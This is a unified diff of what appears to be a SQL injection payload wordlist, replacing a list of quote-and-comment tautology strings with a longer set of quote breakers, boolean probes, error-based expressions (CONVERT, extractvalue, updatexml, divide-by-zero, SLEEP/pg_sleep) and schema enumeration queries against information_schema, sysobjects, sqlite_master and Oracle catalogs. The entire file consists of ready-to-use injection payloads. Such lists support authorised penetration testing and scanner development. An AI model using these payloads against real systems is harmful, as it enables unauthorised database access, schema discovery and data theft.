@@ -1,69 +1,114 @@
-1 or 1 = 1
-1 or 1 = 1 -- -
-1 or 1 = 1 #
-1 or 1 = 1 /*
-1) or (1 = 1
-1) or (1 = 1 -- -
-1) or (1 = 1 #
-1) or (1 = 1 /*
-1) or (1) = (1
-1) or (1) = (1 -- -
-1) or (1) = (1 #
-1) or (1) = (1 /*
-1 -- -
-1 #
-1 /*
-1) -- -
-1) #
-1) /*
-' or '1' = '1
-' or '1' = '1' -- -
-' or '1' = '1' #
-' or '1' = '1' /*
-') or ('1' = '1
-') or ('1') = ('1
-" or "1" = "1
-") or ("1" = "1
-") or ("1") = ("1
-' -- -
-" -- -
-' #
-" #
-' /*
-" /*
-') -- -
-") -- -
-') #
-") #
-') /*
-") /*
-')) -- -
-")) -- -
-')) #
-")) #
-')) /*
-")) /*
-) -- -
-) #
-) /*
-)) -- -
-)) #
-)) /*
-' and '1' = '1
-' and '1' = '1' -- -
-' and '1' = '1' #
-' and '1' = '1' /*
-') and ('1' = '1
-') and ('1') = ('1
-" and "1" = "1
-") and ("1" = "1
-") and ("1") = ("1
-1 and 1 = 1
-1 and 1 = 1 -- -
-1 and 1 = 1 #
-1 and 1 = 1 /*
-1) and (1 = 1
-1) and (1 = 1 -- -
-1) and (1 = 1 #
-1) and (1 = 1 /*
-1) and (1) = (1
+'
+"
+''
+""
+'''
+"""
+'--
+"--
+'#
+"#
+'/*
+"/*
+') 
+")
+')) 
+"))
+' OR '
+" OR "
+' OR '1
+" OR "1
+' OR 1
+" OR 1
+' AND '
+" AND "
+' AND 1
+" AND 1
+' AND '1'='1
+" AND "1"="1
+' AND '1'='2
+" AND "1"="2
+' OR '1'='1
+" OR "1"="1
+' OR '1'='2
+" OR "1"="2
+1'
+1"
+1''
+1""
+1'''
+1"""
+1 OR '
+1 OR "
+1 AND '
+1 AND "
+1 OR '1
+1 OR "1
+1 AND '1
+1 AND "1
+1 OR '1'='1
+1 OR "1"="1
+1 AND '1'='1
+1 AND "1"="1
+1 AND '1'='2
+1 AND "1"="2
+1 OR '1'='2
+1 OR "1"="2
+1 AND 1=CONVERT(int,'a')
+1 AND CAST('a' AS INT)
+1 AND 1/0
+1 AND (SELECT 1/0)
+1 AND (SELECT COUNT(*) FROM nonexistent_table)
+1 AND (SELECT * FROM)
+1 AND (SELECT 'a' FROM)
+1 AND (SELECT SLEEP('a'))
+1 AND (SELECT pg_sleep('a'))
+1 AND (SELECT 1 FROM dual WHERE 1/0)
+1 AND extractvalue(1,concat(0x7e,'a'))
+1 AND updatexml(1,concat(0x7e,'a'),1)
+1 AND JSON_EXTRACT('a', '$')
+1 AND 1=CAST('abc' AS SIGNED)
+1 AND CONVERT('abc', SIGNED)
+1 AND LENGTH(1,2)
+1 AND SUBSTRING(1)
+1 AND REPEAT(1)
+1 AND ASCII('abc')
+1 AND CHAR()
+1 AND MID()
+1 AND FLOOR('abc')
+1 AND CEIL('abc')
+1 AND RAND('abc')
+1 AND LOG('abc')
+1 AND EXP('abc')
+1 AND SIN('abc')
+1 AND COS('abc')
+1 AND TAN('abc')
+1 AND CONCAT(1)
+1 AND CONCAT('a','b','c','d','e','f','g','h','i','j','k','l','m')
+1 AND IF(1=1,'a')
+1 AND CASE WHEN 1=1 THEN 'a'
+1 AND CASE WHEN 1=1 THEN 'a' ELSE 'b'
+1 AND CASE WHEN 1=1 THEN 1 ELSE 'a' END
+1 AND CASE WHEN 'a'='a' THEN 1/0 END
+1 AND (SELECT CASE WHEN 1=1 THEN 1/0 END)
+1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE 'a'='b')
+1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE 'a'='b')
+1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='a')
+1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE column_name='a')
+1 AND (SELECT * FROM information_schema.tables)
+1 AND (SELECT * FROM information_schema.columns)
+1 AND (SELECT 1 FROM information_schema.tables WHERE table_name='a')
+1 AND (SELECT 1 FROM information_schema.columns WHERE column_name='a')
+1 AND (SELECT TOP 1 name FROM sysobjects)
+1 AND (SELECT name FROM sqlite_master)
+1 AND (SELECT name FROM pg_tables)
+1 AND (SELECT name FROM user_tables)
+1 AND (SELECT table_name FROM all_tables)
+1 AND (SELECT column_name FROM all_tab_columns)
+1 AND (SELECT column_name FROM information_schema.columns)
+1 AND (SELECT table_name FROM information_schema.tables)
+1 AND (SELECT * FROM dual)
+1 AND (SELECT 1 FROM dual)
+1 AND (SELECT * FROM sysobjects)
+1 AND (SELECT * FROM sys.tables)
+1 AND (SELECT * FROM sys.columns)
